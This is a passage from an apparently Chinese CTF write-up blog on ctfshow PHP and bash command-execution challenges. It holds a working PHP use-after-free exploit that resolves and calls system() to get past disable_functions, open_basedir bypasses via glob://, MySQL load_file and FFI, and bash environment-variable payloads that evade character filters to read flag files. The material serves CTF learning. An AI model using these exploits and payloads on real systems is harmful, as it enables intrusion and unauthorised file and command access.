&#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;</span><br><span class="line">        $address &#x3D; 0;</span><br><span class="line">        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;&#x3D; 8;</span><br><span class="line">            $address |&#x3D; ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ptr2str($ptr, $m &#x3D; 8) &#123;</span><br><span class="line">        $out &#x3D; &quot;&quot;;</span><br><span class="line">        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff));</span><br><span class="line">            $ptr &gt;&gt;&#x3D; 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;</span><br><span class="line">        $i &#x3D; 0;</span><br><span class="line">        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff));</span><br><span class="line">            $v &gt;&gt;&#x3D; 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak &#x3D; strlen($helper-&gt;a);</span><br><span class="line">        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type &#x3D; leak($base, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        $e_phoff &#x3D; leak($base, 0x20);</span><br><span class="line">        $e_phentsize &#x3D; leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum &#x3D; leak($base, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  &#x3D; leak($header, 0, 4);</span><br><span class="line">            $p_flags &#x3D; leak($header, 4, 4);</span><br><span class="line">            $p_vaddr &#x3D; leak($header, 0x10);</span><br><span class="line">            $p_memsz &#x3D; leak($header, 0x28);</span><br><span class="line"></span><br><span class="line">            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; </span><br><span class="line"></span><br><span class="line">                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size &#x3D; $p_memsz;</span><br><span class="line">            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; </span><br><span class="line">                $text_size &#x3D; $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) &#x3D; $elf;</span><br><span class="line">        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;</span><br><span class="line">            $leak &#x3D; leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref &#x3D; leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref !&#x3D; 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            $leak &#x3D; leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref &#x3D; leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref !&#x3D; 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base &#x3D; 0;</span><br><span class="line">        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr &#x3D; $start - 0x1000 * $i;</span><br><span class="line">            $leak &#x3D; leak($addr, 0, 7);</span><br><span class="line">            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123;</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr &#x3D; $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry &#x3D; leak($addr);</span><br><span class="line">            $f_name &#x3D; leak($f_entry, 0, 6);</span><br><span class="line"></span><br><span class="line">            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123;</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr +&#x3D; 0x20;</span><br><span class="line">        &#125; while($f_entry !&#x3D; 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function trigger_uaf($arg) &#123;</span><br><span class="line"></span><br><span class="line">        $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);</span><br><span class="line">        $vuln &#x3D; new Vuln();</span><br><span class="line">        $vuln-&gt;a &#x3D; $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;</span><br><span class="line">        die(&#39;This PoC is for *nix systems only.&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc &#x3D; 10; </span><br><span class="line">    $contiguous &#x3D; [];</span><br><span class="line">    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(&#39;x&#39;);</span><br><span class="line">    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];</span><br><span class="line"></span><br><span class="line">    $helper &#x3D; new Helper;</span><br><span class="line">    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $closure_handlers &#x3D; str2ptr($abc, 0);</span><br><span class="line">    $php_heap &#x3D; str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr &#x3D; $php_heap - 0xc8;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"></span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line">    $closure_obj &#x3D; str2ptr($abc, 0x20);</span><br><span class="line"></span><br><span class="line">    $binary_leak &#x3D; leak($closure_handlers, 8);</span><br><span class="line">    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#39;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($elf &#x3D; parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#39;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#39;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#39;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $fake_obj_offset &#x3D; 0xd0;</span><br><span class="line">    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); </span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); </span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(&quot;cat &#x2F;flag0.txt&quot;);exit();</span><br></pre></td></tr></table></figure>

<h2 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h2><p>用<code>c=var_export(scandir(&#39;/&#39;));exit();</code>查看根目录，发现文件名变成了<code>flagc.txt</code>，然后<code>c=include(&#39;flagc.txt&#39;);exit();</code>读取文件</p>
<h2 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h2><p><code>scandir()</code>被禁用了，用glob协议查看目录，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;;exit();</span><br></pre></td></tr></table></figure>

<p>文件名又被改成<code>flagx.txt</code>，然后读文件<code>c=readgzfile(&#39;/flagx.txt&#39;);exit();</code></p>
<h2 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h2><p>用glob伪协议查看根目录，找到文件<code>flag36.txt</code>，<code>include</code>读文件发现<code>open_basedir</code>限制，尝试web72的uaf脚本，脚本中有函数被禁用了，好像这个方法也不行了，看了下题目给的hint，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;try &#123;$dbh &#x3D; new PDO(&#39;mysql:host&#x3D;localhost;dbname&#x3D;ctftraining&#39;, &#39;root&#39;,</span><br><span class="line">&#39;root&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;&#x2F;flag36.txt&quot;)&#39;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh &#x3D; null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure>

<p>php调用数据库的功能，这里利用MySQL的<code>load_file()</code>函数进行读取文件，可以绕过了<code>open_basedir</code>限制，注意这里要知道数据库的基本信息</p>
<h2 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h2><p>用glob伪协议查看根目录，找到文件<code>flag36d.txt</code>，方法同上一题。</p>
<h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>同样用glob伪协议查看根目录，找到文件<code>flag36x.txt</code>和<code>readflag</code>，尝试上一题的方法，发现也不行了，看hint，这里用到了FFI，php7.4以上才有。</p>
<blockquote>
<p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ffi &#x3D; FFI::cdef(&quot;int system(const char *command);&quot;);&#x2F;&#x2F;创建一个system对象</span><br><span class="line">$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;&#x2F;&#x2F;没有回显的</span><br><span class="line">$ffi-&gt;system($a);&#x2F;&#x2F;通过$ffi去调用system函数</span><br></pre></td></tr></table></figure>

<p>这里如果直接执行读取<code>flag36x.txt</code>的命令，会发现没有回显，而恰好有一个<code>readflag</code>，猜测其为shell脚本，执行读取<code>flag36x.txt</code>，将其结果输出到<code>1.txt</code>，然后直接访问即可</p>
<h2 id="58-77总结"><a href="#58-77总结" class="headerlink" title="58-77总结"></a>58-77总结</h2><blockquote>
<p><strong>输出打印数组的函数：</strong></p>
<p><code>print_r()</code>、<code>var_dump()</code>、<code>var_export()</code></p>
<p><strong>读取文件内容的函数：</strong></p>
<p><code>show_source()</code>、<code>highlight_file()</code>、<code>readfile()</code>：直接打印输出</p>
<p><code>file_get_contents()</code>：不直接输出，需要打印输出</p>
<p><code>readgzfile()</code>：读压缩文件，解压后输出；如果不是压缩文件，也可以直接读取输出</p>
<p><code>include()</code>：若是php代码，执行代码，读取源代码需要用伪协议；若不是php代码，其它格式当作html直接输出</p>
<p><strong>查看文件目录的方法：</strong></p>
<p>1.<code>scandir()</code>配合上面输出打印数组的函数，进行扫目录</p>
<p>2.glob伪协议（可绕过open_basedir）</p>
<p><strong>绕过open_basedir读文件：</strong></p>
<p>1.uaf脚本<!--72--></p>
<p>2.MySQL的<code>load_file()</code>函数<!--75、76--></p>
<p>3.php7.4以上的FFI，外部函数接口<!--77--></p>
</blockquote>
<h2 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h2><p>打开靶机，查看源码，可以看到，所以这里直接输入命令就行，</p>
<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20210829115409874.png" alt="image-20210829115409874"></p>
<p>尝试了很多命令，都被过滤了，这里最好可以用脚本跑一下哪些被过滤了，实际上fuzz尝试之后发现只有大写字母和${}:?.~等等字符可以通过，所以这里可以使用bash内置环境变量</p>
<blockquote>
<p><strong>bash的内置命令</strong></p>
<p>1.BASH——bash的完整路径名。通常是：<code>/bin/bash</code>或<code>/usr/local/bin/bash</code>。</p>
<p>2.PWD——目前的工作目录</p>
<p>3.PATH——命令搜寻路径</p>
<p>4.HOME——目前使用者的home路径</p>
<p>5.IFS——定义字段分隔字符。默认值为：空格符、tab字符、换行符。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/BkingXD/CTF-Web-/main/images/image-20210829123432317.png" alt="image-20210829123432317"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PWD:0:1&#125;</span>      <span class="comment">#从0下标开始的第一个字符</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PWD:~0:1&#125;</span>     <span class="comment">#从结尾开始往前的第一个字符,l</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PATH:~0&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;PATH:~A&#125;</span>      <span class="comment">#字母A与0效果一样,n</span></span><br></pre></td></tr></table></figure>

<p>所以可以构造<code>payload：$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</code>，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH&#125;：&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">$&#123;PWD&#125;：&#x2F;bin</span><br><span class="line">$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???   相当于   nl flag.php</span><br></pre></td></tr></table></figure>

<h2 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h2><p>题目相较上一题没有太大的变化，尝试上一题的payload，不行，有东西被过滤了，多次测试输入(最好写个脚本)，应该是<code>$PATH</code>被过滤了，这里想想有没有其它可利用的变量</p>
<blockquote>
<p>1.SHLVL——代表shell打开的深度，进程第一次打开shell时<code>$SHLVL=1</code>，然后在此shell中再打开一个shell时<code>$SHLVL=2</code></p>
</blockquote>
<p>官方题解：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;HOME:<span class="variable">$&#123;#HOSTNAME&#125;</span>:<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span>     ====&gt;   t</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;PWD:<span class="variable">$&#123;Z&#125;</span>:<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span>    ====&gt;   /</span><br><span class="line"></span><br><span class="line">/bin/cat flag.php</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;PWD:<span class="variable">$&#123;#&#125;</span>:<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span>???<span class="variable">$&#123;PWD:<span class="variable">$&#123;#&#125;</span>:<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span>??<span class="variable">$&#123;HOME:<span class="variable">$&#123;#HOSTNAME&#125;</span>:<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span> ????.???</span><br></pre></td></tr></table></figure>

<p>还有其它构造的方法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PHP_CFLAGS=-fstack-protector-strong -fpic</span><br><span class="line">PHP_VERSION=7.3.22</span><br><span class="line"></span><br><span class="line"><span class="variable">$&#123;PHP_VERSION:<span class="variable">$&#123;PHP_VERSION:~A&#125;</span>:~<span class="variable">$&#123;SHLVL&#125;</span>&#125;</span>   ====&gt;   3</span><br><span class="line"><span class="variable">$&#123;PHP_CFLAGS:<span class="variable">$&#123;PHP_VERSION:<span class="variable">$&#123;PHP_VERSION:~A&#125;</span>:~<span class="variable">$&#123;SHLVL&#125;</span>&#125;</span>:<span class="variable">$&#123;PHP_VERSION:<span class="variable">$&#123;PHP_VERSION:~A&#125;</span>:~<span class="variable">$&#123;SHLVL&#125;</span>&#125;</span>&#125;</span>====&gt;tac</span><br><span class="line"></span><br><span class="line">tac flag.php</span><br><span class="line"><span class="variable">$&#123;PHP_CFLAGS:<span class="variable">$&#123;PHP_VERSION:<span class="variable">$&#123;PHP_VERSION:~A&#125;</span>:~<span class="variable">$&#123;SHLVL&#125;</span>&#125;</span>:<span class="variable">$&#123;PHP_VERSION:<span class="variable">$&#123;PHP_VERSION:~A&#125;</span>:~<span class="variable">$&#123;SHLVL&#125;</span>&#125;</span>&#125;</span> ????.???</span><br></pre></td></tr></table></figure>

<h2 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h2><p>这题给了源码，HOME也过滤了，并且长度要小于65</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>官方payload：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;PWD::<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span>???<span class="variable">$&#123;PWD::<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span>?<span class="variable">$&#123;USER:~A&#125;</span>? ????.???</span><br><span class="line"><span class="comment">#$USER最后一位是a</span></span><br></pre></td></tr></table></figure>

<p>其它构造：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin/base64 flag.php</span><br><span class="line"><span class="variable">$&#123;PWD::<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span>???<span class="variable">$&#123;PWD::<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span>?????<span class="variable">$&#123;#RANDOM&#125;</span> ????.???</span><br><span class="line"><span class="comment">#需要RANDOM随机出4位数，$&#123;#RANDOM&#125;表示取长度</span></span><br></pre></td></tr></table></figure>

<h2 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h2><p>又增加了一些过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>官方payload：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/rev</span><br><span class="line"><span class="variable">$&#123;PWD::<span class="variable">$&#123;#?&#125;</span>&#125;</span>???<span class="variable">$&#123;PWD::<span class="variable">$&#123;#?&#125;</span>&#125;</span><span class="variable">$&#123;PWD:<span class="variable">$&#123;#IFS&#125;</span>:<span class="variable">$&#123;#?&#125;</span>&#125;</span>?? ????.???</span><br></pre></td></tr></table></figure>

<p>其它payload：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin/base64 flag.php</span><br><span class="line"><span class="variable">$&#123;PWD:<span class="variable">$&#123;#&#125;</span>:<span class="variable">$&#123;##&#125;</span>&#125;</span>???<span class="variable">$&#123;PWD:<span class="variable">$&#123;#&#125;</span>:<span class="variable">$&#123;##&#125;</span>&#125;</span>?????<span class="variable">$&#123;#RANDOM&#125;</span> ????.???</span><br><span class="line"><span class="comment">#$&#123;PWD::$&#123;##&#125;&#125;输出/ $&#123;RANDOM&#125;输出随机数 $&#123;#RANDOM&#125;输出随机数字的长度，所以加上#就是输出他输出内容的长度</span></span><br></pre></td></tr></table></figure>

<h2 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h2><p>PWD、#过滤掉了，但HOME又可用了，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system(<span class="variable">$code</span>).<span 